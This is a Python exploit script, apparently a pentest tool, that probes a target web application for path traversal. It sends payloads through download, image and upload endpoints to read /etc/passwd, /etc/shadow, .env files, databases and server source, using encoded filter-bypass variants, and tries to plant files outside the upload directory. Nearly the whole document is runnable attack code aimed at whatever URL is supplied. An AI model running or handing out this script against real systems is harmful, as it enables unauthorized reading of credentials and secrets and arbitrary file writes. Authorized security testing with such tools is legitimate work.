#!/usr/bin/env python3

import requests
import sys

class PathTraversalExploit:
    def __init__(self, target_url):
        self.target_url = target_url
        self.session = requests.Session()
    
    def test_file_parameter_traversal(self):
        print("[+] Testing path traversal via file parameter...")
        
        payloads = [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
            "../../../../etc/shadow",
            "../../../var/log/apache2/access.log",
            "../../database.db",
            "../.env",
            "../../package.json",
            "../../../proc/version",
            "....//....//....//etc/passwd",
            "..%2f..%2f..%2fetc%2fpasswd",
            "..%252f..%252f..%252fetc%252fpasswd"
        ]
        
        for payload in payloads:
            params = {'file': payload}
            response = self.session.get(f"{self.target_url}/download", params=params)
            
            if response.status_code == 200 and len(response.text) > 0:
                print(f"[SUCCESS] Path traversal: {payload}")
    
    def test_image_path_traversal(self):
        print("[+] Testing path traversal in image requests...")
        
        image_payloads = [
            "../../../etc/passwd",
            "../../database.db",
            "../server.js",
            "../../package.json"
        ]
        
        for payload in image_payloads:
            response = self.session.get(f"{self.target_url}/image/{payload}")
            if response.status_code == 200:
                print(f"[SUCCESS] Image path traversal: {payload}")
    
    def test_upload_path_traversal(self):
        print("[+] Testing path traversal in upload functionality...")
        
        traversal_names = [
            "../../../malicious.txt",
            "..\\..\\..\\malicious.txt",
            "....//....//malicious.txt"
        ]
        
        for name in traversal_names:
            files = {'file': (name, 'malicious content', 'text/plain')}
            response = self.session.post(f"{self.target_url}/upload", files=files)
            
            if response.status_code == 200:
                print(f"[SUCCESS] Upload path traversal: {name}")
    
    def run_all_tests(self):
        print("=" * 60)
        print("PATH TRAVERSAL VULNERABILITY TESTING")
        print("=" * 60)
        
        self.test_file_parameter_traversal()
        self.test_image_path_traversal()
        self.test_upload_path_traversal()
        
        print("\n[INFO] Path traversal testing completed!")

def main():
    if len(sys.argv) != 2:
        print("Usage: python3 path_traversal.py <target_url>")
        sys.exit(1)
    
    target_url = sys.argv[1].rstrip('/')
    exploit = PathTraversalExploit(target_url)
    exploit.run_all_tests()

if __name__ == "__main__":
    main()